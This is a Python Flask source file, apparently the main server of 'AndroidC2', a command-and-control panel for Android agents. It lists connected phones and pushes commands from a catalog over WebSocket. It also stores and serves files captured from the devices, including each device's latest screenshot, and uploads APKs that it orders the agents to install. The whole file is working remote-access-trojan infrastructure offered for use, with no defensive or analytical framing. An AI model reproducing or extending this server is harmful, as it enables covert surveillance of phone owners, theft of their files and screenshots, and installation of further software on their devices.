"""AndroidC2 — main entry point."""

import os
from datetime import datetime

from flask import Flask, render_template, jsonify, request, send_file
from config import Config

from database import init_db, db
from c2.agent_api import agent_api
from c2.ws_dashboard import init_socketio, socketio, broadcast
from c2.agent_ws import register_agent_ws, send_command_to_agent, agent_online
from c2.command_builder import COMMAND_CATALOG, build_command
from models import Device, Command, CapturedFile, LogEntry


def create_app():
    app = Flask(__name__, static_folder="static", template_folder="templates")
    app.config.from_object(Config)

    os.makedirs(os.path.join(app.config["UPLOAD_FOLDER"], "to_agent"), exist_ok=True)

    init_db(app)
    init_socketio(app)
    app.register_blueprint(agent_api)

    # Attach agent WebSocket namespace
    register_agent_ws()

    # ---------- UI ----------
    @app.route("/")
    def index():
        return render_template("index.html")

    # ---------- Devices ----------
    @app.route("/api/devices")
    def api_devices():
        devices = Device.query.order_by(Device.last_seen.desc()).all()
        result = []
        for d in devices:
            data = d.to_dict()
            data["ws_online"] = agent_online(d.device_id)
            result.append(data)
        return jsonify(result)

    @app.route("/api/device/<int:dev_id>")
    def api_device(dev_id):
        dev = Device.query.get_or_404(dev_id)
        data = dev.to_dict()
        data["ws_online"] = agent_online(dev.device_id)
        return jsonify(data)

    @app.route("/api/device/<int:dev_id>", methods=["DELETE"])
    def api_delete_device(dev_id):
        dev = Device.query.get_or_404(dev_id)
        db.session.delete(dev)
        db.session.commit()
        return jsonify({"ok": True})

    @app.route("/api/device/<int:dev_id>/notes", methods=["POST"])
    def api_set_notes(dev_id):
        dev = Device.query.get_or_404(dev_id)
        dev.notes = request.get_json(force=True).get("notes", "")
        db.session.commit()
        return jsonify({"ok": True})

    @app.route("/api/device/<int:dev_id>/tags", methods=["POST"])
    def api_set_tags(dev_id):
        dev = Device.query.get_or_404(dev_id)
        tags = request.get_json(force=True).get("tags", [])
        dev.tags = ",".join(t.strip() for t in tags if t.strip())
        db.session.commit()
        return jsonify(dev.to_dict())

    # ---------- Commands ----------
    @app.route("/api/device/<int:dev_id>/commands")
    def api_commands(dev_id):
        cmds = (Command.query.filter_by(device_id=dev_id)
                .order_by(Command.created_at.desc()).limit(200).all())
        return jsonify([c.to_dict() for c in cmds])

    @app.route("/api/device/<int:dev_id>/command", methods=["POST"])
    def api_send_command(dev_id):
        dev = Device.query.get_or_404(dev_id)
        data = request.get_json(force=True)
        ctype = data.get("type")
        args = data.get("args", {})
        if ctype not in COMMAND_CATALOG:
            return jsonify({"error": "unknown command type"}), 400

        cmd = build_command(dev, ctype, args)

        # Try to push over WebSocket if agent is connected
        pushed = send_command_to_agent(dev.device_id, {
            "id": cmd.id,
            "type": cmd.command_type,
            "args": cmd.args(),
        })
        if pushed:
            cmd.status = "sent"
            cmd.delivered_at = datetime.utcnow()
            db.session.commit()

        broadcast("new_command", cmd.to_dict())
        return jsonify({"id": cmd.id, "pushed": pushed, "status": cmd.status})

    @app.route("/api/catalog")
    def api_catalog():
        return jsonify(COMMAND_CATALOG)

    # ---------- Files ----------
    @app.route("/api/device/<int:dev_id>/files")
    def api_files(dev_id):
        files = (CapturedFile.query.filter_by(device_id=dev_id)
                 .order_by(CapturedFile.captured_at.desc()).all())
        return jsonify([f.to_dict() for f in files])

    @app.route("/api/file/<int:file_id>/raw")
    def api_file_raw(file_id):
        cf = CapturedFile.query.get_or_404(file_id)
        return send_file(cf.stored_path, as_attachment=False,
                         download_name=cf.filename, mimetype=cf.mime_type)

    @app.route("/api/file/<int:file_id>/download")
    def api_file_download(file_id):
        cf = CapturedFile.query.get_or_404(file_id)
        return send_file(cf.stored_path, as_attachment=True,
                         download_name=cf.filename)

    @app.route("/api/device/<int:dev_id>/latest-screenshot")
    def api_latest_screenshot(dev_id):
        cf = (CapturedFile.query
              .filter_by(device_id=dev_id, category="screenshot")
              .order_by(CapturedFile.captured_at.desc()).first())
        if not cf:
            return jsonify({"error": "no_screenshot"}), 404
        return send_file(cf.stored_path, mimetype=cf.mime_type)

    @app.route("/api/device/<int:dev_id>/upload_to_agent", methods=["POST"])
    def api_upload_to_agent(dev_id):
        dev = Device.query.get_or_404(dev_id)
        f = request.files.get("file")
        if not f:
            return jsonify({"error": "no file"}), 400
        dest = os.path.join(Config.UPLOAD_FOLDER, "to_agent",
                            f"{dev.device_id}_{f.filename}")
        f.save(dest)
        cmd = build_command(dev, "install_apk", {"path": dest})
        return jsonify(cmd.to_dict())

    # ---------- Logs ----------
    @app.route("/api/device/<int:dev_id>/logs")
    def api_logs(dev_id):
        logs = (LogEntry.query.filter_by(device_id=dev_id)
                .order_by(LogEntry.created_at.desc()).limit(500).all())
        return jsonify([l.to_dict() for l in logs])

    # ---------- Push endpoint ----------
    @app.route("/api/device/<int:dev_id>/push", methods=["POST"])
    def api_push_command(dev_id):
        """Send a command directly over WebSocket (faster than poll)."""
        dev = Device.query.get_or_404(dev_id)
        data = request.get_json(force=True)
        ctype = data.get("type")
        args = data.get("args", {})
        if ctype not in COMMAND_CATALOG:
            return jsonify({"error": "unknown_command"}), 400

        cmd = build_command(dev, ctype, args)
        pushed = send_command_to_agent(dev.device_id, {
            "id": cmd.id,
            "type": cmd.command_type,
            "args": cmd.args(),
        })
        if pushed:
            cmd.status = "sent"
            cmd.delivered_at = datetime.utcnow()
            db.session.commit()
        return jsonify({"id": cmd.id, "pushed": pushed, "status": cmd.status})

    @app.errorhandler(404)
    def nf(_):
        return jsonify({"error": "not_found"}), 404

    return app


if __name__ == "__main__":
    app = create_app()
    socketio.run(
        app,
        host=Config.C2_HOST,
        port=Config.C2_PORT,
        debug=False,
        allow_unsafe_werkzeug=True,
    )
